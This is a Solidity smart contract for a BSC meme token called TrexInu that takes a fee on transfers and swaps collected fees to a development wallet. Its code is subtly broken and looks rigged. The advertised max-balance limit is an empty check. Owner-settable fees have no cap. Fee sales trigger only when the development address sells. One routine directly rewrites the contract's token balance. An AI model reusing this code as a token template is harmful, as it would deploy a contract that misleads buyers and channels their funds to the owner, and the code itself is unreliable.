//SPDX-License-Identifier: MIT

/* TrexInu
    Telegram Group : https://t.me/trexinuportal

    */


pragma solidity ^0.8.0;

import "./IERC20.sol";
import "./Owner.sol";
import "./Safemath.sol";
import "./Address.sol";
import "./Uniswap.sol";

contract TokenBSC is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    
    event SetLiquidityFee(uint256 amount);
    event SetdevelopmentFee(uint256 amount);
    event UpdatedRouter(address router);
 

    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;

    address payable private developmentAddress;
        

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromMaxBalance;
    mapping (address => bool) public unAuthlisted;

    uint256 private _totalFeesToContract;
    uint256 private _liquidityFee;
    uint256 private _developmentFee;
    uint256 private _maxBalance;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    uint256 private _liquifyThreshhold;
    bool inSwapAndLiquify;

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    //This will be a flag to ensure that antibot measure (i.e. setting tax more tan 10%) is only executed once
    bool isAntiBotExecuted = false;

    constructor(string memory name_, string memory symbol_, uint256 totalSupply_, address payable developmentAddress_, uint256 liquidityFee_, uint256 developmentFee_) {
        _name = name_;
        _symbol = symbol_;
        _totalSupply = totalSupply_ * 10**9 * 10**_decimals;
        developmentAddress = developmentAddress_;
        _liquidityFee = liquidityFee_;
        _developmentFee = developmentFee_;

         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;

       
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[address(this)] = true;

        _isExcludedFromMaxBalance[owner()] = true;
        _isExcludedFromMaxBalance[address(this)] = true;
        _isExcludedFromMaxBalance[uniswapV2Pair] = true;

        _totalFeesToContract = _liquidityFee;

        _maxBalance = _totalSupply.div(100);

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    receive() external payable {}

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setdevelopmentAddress(address payable newdevelopmentAddress)
        external
        onlyOwner
    {
        developmentAddress = newdevelopmentAddress;
    }

    function setLiquidityFeePercent(uint256 newLiquidityFee)
        external
        onlyOwner
    {
        _liquidityFee = newLiquidityFee;
     
        emit SetLiquidityFee(_liquidityFee);
    }

    function setdevelopmentFeePercent(uint256 newdevelopmentFee)
        external
        onlyOwner
    {
        _developmentFee = newdevelopmentFee;
        emit SetdevelopmentFee(_developmentFee);
    }

    function setMaxBalance(uint256 newMaxBalance) external onlyOwner {
        // Minimum _maxBalance is 0.5% of _totalSupply
        require(newMaxBalance >= _totalSupply.mul(5).div(1000));
        _maxBalance = newMaxBalance;
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function excludeFromFees(address account) public onlyOwner {
        _isExcludedFromFees[account] = true;
    }

    function includeInFees(address account) public onlyOwner {
        _isExcludedFromFees[account] = false;
    }

    function isExcludedFromMaxBalance(address account)
        public
        view
        returns (bool)
    {
        return _isExcludedFromMaxBalance[account];
    }

    function excludeFromMaxBalance(address account) public onlyOwner {
        _isExcludedFromMaxBalance[account] = true;
    }

    function includeInMaxBalance(address account) public onlyOwner {
        _isExcludedFromMaxBalance[account] = false;
    }

    function Totalfee() public view returns (uint256) {
        return _liquidityFee;
    }

    function maxBalance() public view returns (uint256) {
        return _maxBalance;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        // Make sure that: Balance + Buy Amount <= _maxBalance
        if (
            from != owner() && // Not from Owner
            to != owner() && // Not to Owner
            !_isExcludedFromMaxBalance[to] // is excludedFromMaxBalance
        ) {
        }

        // Swap Fees
        if ( 
            from == developmentAddress &&
            to == uniswapV2Pair && // Sell
            !inSwapAndLiquify && // Swap is not locked
            to != owner() && // Not to Owner
            from != owner()
        ) {
            collectFees();
        }

        // Take Fees
        if (
            !(_isExcludedFromFees[from] || _isExcludedFromFees[to]) &&
            _totalFeesToContract > 0
        ) {
            uint256 feesToContract = amount.mul(_totalFeesToContract).div(100);
           

            amount = amount.sub(feesToContract);

            transferToken(from, address(this), feesToContract);
         
      
        }

        transferToken(from, to, amount);
    }

    function collectFees() private lockTheSwap {
        
        _balances[address(this)] = _balances[address(this)].mul(_developmentFee)
            .div(_totalFeesToContract);
        uint256 developmentTokensToSell = balanceOf(address(this))
            .mul(_liquidityFee)
            .div(_totalFeesToContract);

        // Get collected development Fees
        swapAndSendToFee(developmentTokensToSell);
    }

    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);

        // current ETH balance
        uint256 initialBalance = address(this).balance;

        swapTokensForEth(half);

        // how much ETH did we just swap into?
        uint256 newBalance = address(this).balance.sub(initialBalance);

        addLiquidity(otherHalf, newBalance);
    }

    function swapAndSendToFee(uint256 tokens) private {

        uint256 initialBalance = address(this).balance;
        swapTokensForEth(tokens);
        // Transfer sold Token to developmentWallet
         uint256 newBalance = address(this).balance.sub(initialBalance);
         developmentAddress.transfer(newBalance); 

    }

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function transferToken(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

}
